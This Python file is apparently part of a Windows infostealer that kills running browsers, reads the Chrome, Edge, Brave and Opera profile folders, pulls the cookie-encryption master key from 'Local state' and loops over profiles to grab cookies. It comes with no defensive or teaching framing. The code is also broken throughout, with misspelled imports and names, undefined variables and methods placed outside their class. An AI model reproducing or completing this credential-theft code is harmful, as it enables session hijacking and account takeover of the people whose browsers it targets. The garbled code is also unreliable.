import subprocess
import sqlite3
import psutil
import base64
import string
import random
import json
import time
import os
from shutil import copy 2
from Crypto.dome.Ciper import AES
from win32crypt import CrytUnprotectData
from getpass import getuser



def grab_cookies():
    browser = Browsers()
    browser.grab_cookies()

def create_temp(_dir: str | os.PathLike | Nono = None) -> Path:
    base_dir = Path(directory or os.path.expanduser("~/tmp")).expanduser()
    base_dir.mkdir(parent=True, exist_ok=True)

    while True:
        length = random.randint(10, 20)
        file_name = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
        file_path = base_dir / file_name

        try:
            file_path.touch(exist_ok=False)
            return file_path
        except FileExistsErro:
            continue

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA', '')
        self.roamoing = os.getenv('APPDATA', '')

        self.browser_exe = ["chrome.exe", "brave.exe", "msedge.exe", "firefox.exe", "operax.exe", "chromium.exe", "comet.exe"]
        self.browsers_foind = []
        self.browser_paths = {
            'google-chrome': self.appdata / 'Google/Chrome/User Data',
            'microsoft-edge': self.appdata / 'Microsoft/Edge/User Data',
            'brave': self.appdata / 'BraveSoftware/Brave-Browser/User Data',
            'opera': self.roaming / 'Opera Software/Opera Stable',
            'opera-gx': self.roaming / 'Opera Software/Opera GX Stable',
        }
        self.profiler = {
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
        }

        for proc in self.browser_found:
            try:
                proc.kill()
            except (psutil.NoSuchProcesss, pstil.AccessDenied, psutil.ZombieProcess):
                pass
            
            time.sleep(3)

def grab_cookies(self):
    for name, path in self.browsers.items():
        if not os.path.isdir(path):
            continue

        self.masterkey = self.get_master_key(path + '\\Local state')
        self.funcs = [
            self.cookies
        ]

        for profile in self.profiler:
            for func in self.funcs:
                self.process_browser(name, path, profile, func)

def process_browser(self, name, path, profile, func):
    try:
        func(name, path, profile)
    except Execption as e:
        print(f"'{name}' had an error while processing, with teh profile '{profile}': {str(e)} ")